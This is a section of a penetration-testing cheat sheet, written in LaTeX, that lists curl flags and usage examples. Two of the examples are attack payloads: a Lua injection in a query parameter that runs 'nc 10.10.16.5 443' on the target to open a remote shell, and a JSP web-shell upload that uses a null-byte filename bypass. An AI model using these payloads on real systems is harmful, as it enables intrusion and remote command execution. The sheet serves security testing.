
\section{curl}
\label{tool:curl}

\begin{verbatim}

## Basic
-O
-o file          Download
-T file          Upload file
-u user:passwd   basic auth
-v               --verbose
-vv              Even more verbose
-s               --silent: don't show progress meter or errors
-S               --show-error: when used with --silent (-sS), show errors but no progress meter
-i               --include: Include the HTTP-header in the output
-I               --head: headers only
-x http://localhost:8080 burp proxy

## SSL
--ciphers DEFAULT@SECLEVEL=0   # for old SSL/TLS


 --cacert <file>
 --capath <dir>

-E, --cert <cert>     # --cert: Client cert file
    --cert-type       # der/pem/eng
-k, --insecure        # for self-signed certs



## Request
-X (POST|GET...) --request
-L               follow links if redirect
-F               HTTP POST data for multipart/form-data

## Data
-d 'data'         inline data
--data-{ascii|binary|raw|urlencode} 'data'             

-d @file          data via file
-G                send data by appending it to the URL with a '?' separator.

## Headers
-A str            set User-Agent
-H "X-foo: y"     Set header
-b "name=val"       cookie
--compressed 

curl -O                Download
curl -T                Upload

# Common headers
Authorization: Basic YWRtaW46YWRtaW4=
Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1
Content-Type: application/json
```

# formating

| jq


# Exeamples
# POST REQUEST FROM A FILE AND HEADER FROM FILE
curl -X POST -H @header.req --data "@body.req" http://X/x.php?action=upload

# TFTP transfert
curl -T <file> tftp://<IP>

# get 
curl -s -G --data-urlencode "city=') os.execute('nc 10.10.16.5 443') --"
    http://10.10.10.218/weather/forecast

# Post data:
curl -d password=x http://x.com/y

# Auth/data:
curl -u user:pass -d status="Hello" http://twitter.com/statuses/update.xml

# multipart file upload
curl -v -include --form key1=value1 --form upload=@localfilename URL

# multipart form: send data from text field and upload file
curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi

curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 
    'http://IP/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

# Use Curl to Check if a remote resource is available
# details: https://matthewsetter.com/check-if-file-is-available-with-curl/
curl -o /dev/null --silent -Iw "%{http_code}" https://example.com/my.remote.tarball.gz
\end{verbatim}

\subsection*{links}
\url{https://www.hackingarticles.in/a-detailed-guide-on-hydra}
